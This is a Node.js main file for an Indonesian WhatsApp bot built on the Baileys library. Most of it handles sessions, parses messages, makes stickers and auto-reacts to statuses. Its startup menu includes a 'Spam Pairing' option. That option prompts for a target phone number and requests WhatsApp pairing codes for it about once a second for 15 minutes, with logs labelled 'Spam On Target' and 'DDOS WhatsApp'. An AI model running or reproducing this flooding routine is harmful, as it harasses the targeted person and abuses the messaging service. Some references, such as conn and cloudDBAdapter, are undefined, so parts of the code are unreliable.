require('./config')
const { default: makeWASocket, DisconnectReason, makeInMemoryStore, jidDecode, proto, getContentType, useMultiFileAuthState, downloadContentFromMessage } = require("@adiwajshing/baileys")
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const chalk = require('chalk')
const CFonts = require('cfonts')
const path = require('path')
const readline = require("readline");
const _ = require('lodash')
const FileType = require('file-type')
const yargs = require('yargs/yargs')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const PhoneNumber = require('awesome-phonenumber')
const lolcatjs = require('lolcatjs')
const { formatSize, runtime, sleep, serialize,  color, getBuffer } = require("./lib/myfunc")
var low
try {
low = require('lowdb')
} catch (e) {
low = require('./lib/lowdb')}
//=================================================//
const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')
//=================================================//
function createTmpFolder() {
const folderName = "tmp";
const folderPath = path.join(__dirname, folderName);
if (!fs.existsSync(folderPath)) {
fs.mkdirSync(folderPath);
lolcatjs.fromString(`Folder '${folderName}' berhasil dibuat.`);
} else {
lolcatjs.fromString(`Folder '${folderName}' sudah ada.`);
}
}
createTmpFolder();
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
console.log('\x1b[1;91m┌──────────────────────────────────┐ ')
	console.log('\x1b[1;91m│┌────────────────────────────────┐│')
	console.log('\x1b[1;91m││	⠀⠀⠀⣀⣤⣴⣶⣾⡿⠿⠿⢿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀  ⠀\x1b[1;91m⠀││')
	console.log('\x1b[1;91m││⠀⠀⠀⠀ ⠀⣠⣴⣿⠟⠋⠉⠀\x1b[1;97m⣀⣤⣤⣤⣤⣤⣀⡉⠙⠻⣿⣦⣄⠀⠀⠀ ⠀⠀\x1b[1;91m││')
	console.log('\x1b[1;91m││⠀⠀ ⠀⣠⣾⡿⠋\x1b[1;91m⢀⡄⠀\x1b[1;97m⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠙⢿⣷⣄⠀⠀⠀ \x1b[1;91m││')
	console.log('\x1b[1;91m││ ⠀⠀⣴⣿⠋\x1b[1;91m⢀⣴⣿⠀\x1b[1;97m⢰⣿⣿⣿⡟⠛⢻⣿⣿⣿⣿⣿⣿⣿⣷⡄⠙⣿⣦⠀ \x1b[1;91m⠀││')
	console.log('\x1b[1;91m││ ⠀⣼⡿⠁\x1b[1;91m⣰⣿⣿⡇⠀\x1b[1;97m⢸⣿⣿⣿⣧⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠈⢿⣧⠀ \x1b[1;91m││')
	console.log('\x1b[1;91m││ ⢰⣿⠃\x1b[1;91m⢰⣿⣿⣿⣿⡀\x1b[1;97m⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠛⠿⣿⣿⡄⠘⣿⡆ \x1b[1;91m││')
	console.log('\x1b[1;91m││ ⣾⡿⠀\x1b[1;91m⣾⣿⣿⣿⣿⣷⣄⠀\x1b[1;97m⠙⠿⣿⡿⠋⠁\x1b[1;94m⢀⣤⣤⣶⣦⣤⣀\x1b[1;97m⠀⠙⢷⠀⢿⣷ \x1b[1;91m││')
	console.log('\x1b[1;94m││ ⣿⡇⠀\x1b[1;91m⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀\x1b[1;94m⢼⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠀⢸⣿ ││')
	console.log('\x1b[1;94m││ ⢿⣷⠀\x1b[1;91m⢿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣷⠀\x1b[1;94m⠘⣿⣿⣿⠟⠛⢿⣿⣿⣿⡀⠀⣾⡿ ││')
	console.log('\x1b[1;94m││ ⠸⣿⡄\x1b[1;91m⠸⣿⣿⣿⣿⡁⠀⣸⣿⣿⣿⣿⠀\x1b[1;94m⢠⣿⣿⣿⣦⣤⣾⣿⣿⣿⠃⢠⣿⠇ ││')
	console.log('\x1b[1;94m││ ⠀⢻⣷⡀\x1b[1;91m⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀\x1b[1;94m⣼⣿⣿⣿⣿⣿⣿⣿⣿⠏⢀⣾⡟⠀ ││')
	console.log('\x1b[1;94m││ ⠀⠀⠻⣿⣄\x1b[1;91m⠈⠛⠿⣿⣿⡿⠿⠋⠁\x1b[1;94m⢀⣼⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⠟⠀⠀ \x1b[1;94m││')
	console.log('\x1b[1;94m││⠀ ⠀⠀⠙⢿⣷⣄⠀⠀\x1b[1;94m⢀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⡿⠟⠉⣠⣾⡿⠋⠀⠀⠀ ││')
	console.log('\x1b[1;94m││ ⠀⠀⠀⠀⠀\x1b[1;97m⠙⠻⣿⣦⣄\x1b[1;94m⣈⠉⠙⠛⠛⠛⠛⠛⠉\x1b[1;97m⣁⣠⣴⣿⠟⠋⠀⠀⠀⠀ ⠀\x1b[1;94m\x1b[1;94m││')
	console.log('\x1b[1;94m││ ⠀⠀⠀⠀⠀   ⠀\x1b[1;97m⠉⠛⠻⠿⢿⣷⣶⣶⣾⡿⠿⠟⠛⠉ ⠀⠀⠀⠀⠀ ⠀\x1b[1;94m││')
	console.log('\x1b[1;94m││ \x1b[1;97m┌───────\x1b[1;91m>\x1b[1;92m >\033[1;96m > 🔥 \033[1;96m< \x1b[1;92m<\x1b[1;91m <\x1b[1;94m\x1b[1;97m───────┐ \x1b[1;94m ││')
	console.log('\x1b[1;97m││ ├─➢ \x1b[1;91m[\x1b[1;97m1\x1b[1;91m] \x1b[1;97mCreator SC LILY     │  ││')
	console.log('││ ├─➢ \x1b[1;91m[\x1b[1;97m2\x1b[1;91m] \x1b[1;97mYt : FallZx Infinity│  ││')
	console.log('││ ├─➢ \x1b[1;91m[\x1b[1;97m3\x1b[1;91m] \x1b[1;97mIG : FallXd_781     │  ││')
	console.log('││ ├─➢ \x1b[1;91m[\x1b[1;97m4\x1b[1;91m] \x1b[1;97mCredits : FallZx    │  ││')
	console.log('││ ├─➢ \x1b[1;91m[\x1b[1;97m5\x1b[1;91m] \x1b[1;97mSC : Hillary MD  ⠀  │  ││')
	console.log('││ ├─➢ \x1b[1;91m[\x1b[1;97m0\x1b[1;91m] \x1b[1;97mVersion : 1.8       │  ││')
	console.log('││ └───────\x1b[1;91m>\x1b[1;92m >\033[1;96m > 🔥 \033[1;96m< \x1b[1;92m<\x1b[1;91m <\x1b[1;94m\x1b[1;97m───────╯  ││')
	console.log('│└────────────────────────────────╯│ ')
	console.log('\x1b[1;97m└──╮🎭────────────────────────🎭╭────╯')
	console.log('   \x1b[1;97m│🚦 HILLARY ABIGAIL  BETA 🚦   │')
	console.log('   \x1b[1;97m└────────────────────────────┘ ')
//=================================================//
//=================================================//
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.db = new Low(
/https?:\/\//.test(opts['db'] || '') ?
new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
new mongoDB(opts['db']) :
new JSONFile(`./src/database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
if (global.db.data !== null) return
global.db.READ = true
await global.db.read()
global.db.READ = false
global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
...(global.db.data || {})}
  global.db.chain = _.chain(global.db.data)}
loadDatabase()


const question = (text) => { const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); return new Promise((resolve) => { rl.question(text, resolve) }) };

async function startBotz() {
const { state, saveCreds } = await useMultiFileAuthState("session")
const Lily = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: false,
auth: state,
connectTimeoutMs: 60000,
defaultQueryTimeoutMs: 0,
keepAliveIntervalMs: 10000,
emitOwnEvents: true,
fireInitQueries: true,
generateHighQualityLinkPreview: true,
syncFullHistory: true,
markOnlineOnConnect: true,
browser: ["Ubuntu", "Chrome", "20.0.04"],
});

    async function spamPairingRequest() {
  const startTime = Date.now();
  const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
  const phoneNumber = await question('Masukkan Nomor WhatsApp Target:\n');

  // Sanitasi nomor telepon
  const sanitizedPhoneNumber = phoneNumber.replace(/[^0-9]/g, '');

  while (Date.now() - startTime < duration) {
    let attempts = 100; // Jumlah percobaan per iterasi
    while (attempts > 0) {
      try {
        const pairingCodeResponse = await Lily.requestPairingCode(sanitizedPhoneNumber);
        console.log(`Spam On Target: ${pairingCodeResponse}`);
      } catch (error) {
        console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
      }

      console.log(`DDOS WhatsApp: ${attempts} detik...`);
      await new Promise(resolve => setTimeout(resolve, 1000)); // 1 detik per iterasi
      attempts--;
    }

    console.log('Mengirim Ulang Dalam 30 detik...');
    await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
  }

  console.log('Selesai. 15 menit telah berlalu.');
    }
if (!Lily.authState.creds.registered) {
const phoneNumber = await question(`\x1b[1;91m⪨ \x1b[1;96m一一一\x1b[1;94m【 \x1b[1;97mLogin Database\x1b[1;94m 】\x1b[1;96m一一一 \x1b[1;91m⪩ \n丨\x1b[1;91m[\x1b[1;97m 1 \x1b[1;91m] \x1b[1;97mPairing Code\n丨\x1b[1;91m[\x1b[1;97m 2 \x1b[1;91m] \x1b[1;97mSpam Pairing\n\x1b[1;91m⪨ \x1b[1;96m一一一\x1b[1;94m【 \x1b[1;97mConsole By FallZx\x1b[1;94m 】\x1b[1;96m一一一 \x1b[1;91m⪩`);
if (phoneNumber === '1') {
   console.log(`Is connecting Number ${global.bot}\n`);
    const code = await Lily.requestPairingCode(global.bot);
    console.log('Process...');
    await sleep(3000); // Tunggu selama 3000 milidetik
    console.log(`Your Pairing Code: ${chalk.yellow.bold((code))}`);
  } else if (phoneNumber === '2') {
    await spamPairingRequest();
  } else {
    console.log('Pilihan tidak valid.');
  }
}
store.bind(Lily.ev)

Lily.ev.on('messages.upsert', async chatUpdate => {
try {
let mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!Lily.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
m = smsg(Lily, mek, store)
require("./case")(Lily, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})

// Setting
Lily.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

Lily.getName = (jid, withoutContact= false) => {
id = Lily.decodeJid(jid)
withoutContact = Lily.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = Lily.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === Lily.decodeJid(Lily.user.id) ?
Lily.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
}

Lily.public = true

Lily.serializeM = (m) => smsg(Lily, m, store);
Lily.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update;
if (connection === 'close') {
let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
if (reason === DisconnectReason.badSession || reason === DisconnectReason.connectionClosed || reason === DisconnectReason.connectionLost || reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.restartRequired || reason === DisconnectReason.timedOut) {
startBotz();
} else if (reason === DisconnectReason.loggedOut) {
} else {
Lily.end(`Unknown DisconnectReason: ${reason}|${connection}`);
}
} else if (connection === 'open') {
console.log(chalk.cyan.bold('[Connected] ' + JSON.stringify(Lily.user.id, null, 2)));
}
});

Lily.ev.on('creds.update', saveCreds)
Lily.sendText = (jid, text, quoted = '', options) => Lily.sendMessage(jid, { text: text, ...options }, { quoted })
Lily.ev.on('messages.upsert', async (update) => {
        const msg = update.messages[0]
        const maxTime = 5 * 60 * 1000
        Lily.decodeJid = (jid) => {
            if (!jid) return jid
            if (/:\d+@/gi.test(jid)) {
                const decode = jidDecode(jid) || {}
                return (
                    (decode.user && decode.server && decode.user + "@" + decode.server) || jid
                )
            } else return jid
        }    
if (global.settings.autoreact && msg.key.remoteJid === 'status@broadcast') {
            if (msg.key.fromMe) return
            const currentTime = Date.now()
            const messageTime = msg.messageTimestamp * 1000
            const timeDiff = currentTime - messageTime
            
            // Time function
            if (timeDiff <= maxTime) {
                if (msg.pushName && msg.pushName.trim() !== "") {
                    await Lily.readMessages([msg.key])
                    const timestamp = Date.now()
                    const dateObject = new Date(timestamp)
                    const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu']
                    const dayName = days[dateObject.getDay()]
                    const date = dateObject.getDate()
                    const month = dateObject.getMonth() + 1
                    const year = dateObject.getFullYear()
                    const key = msg.key
                    const status = msg.key.remoteJid
                    const me = await Lily.decodeJid(Lily.user.id)
                    const emoji = global.emoji[Math.floor(Math.random() * global.emoji.length)]
                    await Lily.sendMessage(status, {
                      react: {
                        key: key, text: emoji
                      }
                    }, { statusJidList: [key.participant, me] })
                    console.log("React WhatsApp Story")
                    console.log(`• Name: `, msg.pushName)
                    console.log(`• Date: `, `${dayName}, ${date}/${month}/${year}`)
                    console.log(`• React: `, emoji)
                }
            }
        }
})
//=========================================\\
 //=================================================//
Lily.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)}
await Lily.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}    
////////
Lily.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
		const quoted = message.msg || message;
		const mime = quoted.mimetype || '';
		const messageType = (message.mtype || mime.split('/')[0]).replace(/Message/gi, '');
		const stream = await downloadContentFromMessage(quoted, messageType);
		let buffer = Buffer.from([]);
		for await (const chunk of stream) {
			buffer = Buffer.concat([buffer, chunk]);
		}
		const type = await FileType.fromBuffer(buffer);
		const trueFileName = attachExtension ? `./database/sampah/${filename ? filename : Date.now()}.${type.ext}` : filename;
		await fs.promises.writeFile(trueFileName, buffer);
		return trueFileName;
}
Lily.getFile = async (PATH, save) => {
		let res
		let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
		let type = await FileType.fromBuffer(data) || {
			mime: 'application/octet-stream',
			ext: '.bin'
		}
		filename = path.join(__filename, '../database/sampah/' + new Date * 1 + '.' + type.ext)
		if (data && save) fs.promises.writeFile(filename, data)
		return {
			res,
			filename,
			size: await getSizeMedia(data),
			...type,
			data
		}
}
//=========================================\\
Lily.sendTextWithMentions = async (jid, text, quoted, options = {}) => Lily.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted })
//=========================================\\
Lily.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

return Lily
}

startBotz()

function smsg(Lily, m, store) {
if (!m) return m
let M = proto.WebMessageInfo
if (m.key) {
m.id = m.key.id
m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.sender = Lily.decodeJid(m.fromMe && Lily.user.id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = Lily.decodeJid(m.key.participant) || ''
}
if (m.message) {
m.mtype = getContentType(m.message)
m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype])
m.body = m.message.conversation || m.msg.caption || m.msg.text || (m.mtype == 'listResponseMessage') && m.msg.singleSelectReply.selectedRowId || (m.mtype == 'buttonsResponseMessage') && m.msg.selectedButtonId || (m.mtype == 'viewOnceMessage') && m.msg.caption || m.text
let quoted = m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null
m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : []
if (m.quoted) {
let type = getContentType(quoted)
m.quoted = m.quoted[type]
if (['productMessage'].includes(type)) {
type = getContentType(m.quoted)
m.quoted = m.quoted[type]
}
if (typeof m.quoted === 'string') m.quoted = {
text: m.quoted
}
m.quoted.mtype = type
m.quoted.id = m.msg.contextInfo.stanzaId
m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat
m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith('BAE5') && m.quoted.id.length === 16 : false
m.quoted.sender = Lily.decodeJid(m.msg.contextInfo.participant)
m.quoted.fromMe = m.quoted.sender === Lily.decodeJid(Lily.user.id)
m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || ''
m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : []
m.getQuotedObj = m.getQuotedMessage = async () => {
if (!m.quoted.id) return false
let q = await store.loadMessage(m.chat, m.quoted.id, conn)
 return exports.smsg(conn, q, store)
}
let vM = m.quoted.fakeObj = M.fromObject({
key: {
remoteJid: m.quoted.chat,
fromMe: m.quoted.fromMe,
id: m.quoted.id
},
message: quoted,
...(m.isGroup ? { participant: m.quoted.sender } : {})
})
m.quoted.delete = () => Lily.sendMessage(m.quoted.chat, { delete: vM.key })
m.quoted.copyNForward = (jid, forceForward = false, options = {}) => Lily.copyNForward(jid, vM, forceForward, options)
m.quoted.download = () => Lily.downloadMediaMessage(m.quoted)
}
}
if (m.msg.url) m.download = () => Lily.downloadMediaMessage(m.msg)
m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || ''
m.reply = (text, chatId = m.chat, options = {}) => Buffer.isBuffer(text) ? Lily.sendMedia(chatId, text, 'file', '', m, { ...options }) : Lily.sendText(chatId, text, m, { ...options })
m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)))
m.copyNForward = (jid = m.chat, forceForward = false, options = {}) => Lily.copyNForward(jid, m, forceForward, options)

return m
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.magenta.bold(`Update${__filename}`))
delete require.cache[file]
require(file)
})
